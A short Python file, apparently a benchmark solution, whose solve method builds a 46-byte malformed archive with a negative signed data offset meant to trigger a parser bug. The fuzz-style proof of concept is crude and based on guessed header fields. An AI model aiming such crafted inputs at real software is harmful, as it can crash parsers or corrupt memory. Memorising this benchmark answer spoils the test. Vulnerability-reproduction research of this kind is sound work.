import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal archive that triggers negative start offset
        # Based on typical archive header structure with insufficient bounds checking
        
        # Build a malformed archive header that causes negative offset calculation
        # Structure: magic(4) + header_size(4) + data_offset(4) + ... 
        # We'll set data_offset to a value that when processed becomes negative
        
        poc = bytearray()
        
        # Add archive magic bytes (typical values)
        poc.extend(b'ARC\x01')  # 4-byte magic
        
        # Set header size to 46 (matches ground truth)
        # This forces the parser to read our malicious offset field
        poc.extend(struct.pack('<I', 46))  # header_size
        
        # Add padding to reach offset field at position 8
        poc.extend(b'\x00' * 4)  # reserved field
        
        # Critical: Set data_offset to 0xFFFFFFF0 (-16 in two's complement)
        # When used as signed int32, this becomes negative
        # The parser may subtract header size or other values making it more negative
        poc.extend(struct.pack('<i', -16))  # signed 32-bit negative offset
        
        # Add padding to reach exactly 46 bytes
        # Remaining bytes can be arbitrary but must maintain valid structure
        remaining = 46 - len(poc)
        if remaining > 0:
            poc.extend(b'\x00' * remaining)
        
        return bytes(poc)